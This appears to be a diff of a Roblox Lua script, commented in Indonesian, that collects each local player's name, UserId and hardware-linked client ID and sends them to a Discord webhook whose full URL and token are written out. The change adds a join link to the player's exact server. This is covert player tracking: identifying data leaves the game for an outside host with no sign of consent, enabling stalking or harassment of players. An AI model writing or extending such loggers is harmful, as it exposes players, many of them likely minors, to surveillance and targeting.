@@ -17,11 +17,12 @@ end
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local TeleportService = game:GetService("TeleportService")
 
 -- Gantikan ini dengan URL webhook Anda
 local webhookUrl = "https://discord.com/api/webhooks/1251060163398467625/zLMibUZzFIdx_ZsAr-dBT1DFbp3K4w1Q0qFvrunDzlsiuEzbE-tlmqoync5eh_Qhjl9h"
 
--- Fungsi untuk mengirim nama, UserId, dan HWID pemain ke Discord
+-- Fungsi untuk mengirim nama, UserId, HWID, dan link join server pemain ke Discord
 local function sendPlayerInfo()
     local localPlayer = Players.LocalPlayer
     if not localPlayer then
@@ -33,10 +34,16 @@ local function sendPlayerInfo()
     local userId = localPlayer.UserId
     local HWID = RbxAnalyticsService:GetClientId()
 
+    -- Membuat link join server
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local joinLink = "https://www.roblox.com/games/" .. placeId .. "/--?gameInstanceId=" .. jobId
+
     -- Membuat payload untuk dikirim ke Discord
     local data = {
-        ["content"] = "------------\nNama LocalPlayer: " .. playerName .. "\nUserId LocalPlayer: " .. userId .. "\nHWID LocalPlayer: " .. HWID .. "\n------------"
+        ["content"] = "------------\nNama LocalPlayer: " .. playerName .. "\nUserId LocalPlayer: " .. userId .. "\nHWID LocalPlayer: " .. HWID .. "\nJoin Server: " .. joinLink .. "\n------------"
     }
+
 
     -- Mengubah data ke format JSON
     local jsonData = HttpService:JSONEncode(data)
